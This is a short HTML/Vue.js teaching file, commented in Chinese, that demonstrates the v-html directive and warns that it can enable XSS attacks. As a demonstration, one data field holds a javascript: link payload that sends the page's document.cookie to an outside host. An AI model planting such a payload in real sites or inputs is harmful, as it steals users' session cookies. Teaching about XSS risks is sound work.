<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>v-html指令</title>
    <script src="../js/vue.js"></script>
</head>
<body>
    <!--  
        v-html指令：
            1. 作用：向指定节点中渲染包含html结构的内容
            2. 与插值语法的区别：
                (1) v-html会替换掉节点中所有的内容，{{x}}则不会
                (2) v-html可以识别html结构
            3. 严重注意：v-html有安全性问题！！！
                (1) 在网站上动态渲染任意html是非常危险的，容易导致XSS攻击
                (2) 一定要在可信的内容上使用v-html，永远不要用在用户提交的内容上！！！
    -->
    <div id="root">
        <h2 v-html="name"></h2>

        <hr>
        <!-- 可以解析html结构 -->
        <h2 v-html="str"></h2>  
        <!-- 当这么使用的时候，就会将自己当前网页的cookie传递给下一个网页（非常非常不安全！！！） -->
        <h2 v-html="str2"></h2>  
        
    </div>
    <script>
        Vue.config.productionTip = false;

        new Vue({
            el:"#root",
            data:{
                name:"syy",
                str:'<h3>hello</h3>',
                str2: '<a href=javascript:location.href="http://www.xiaomi.com?"+document.cookie>点一下</a>'
            }
        })
    </script>
</body>
</html>
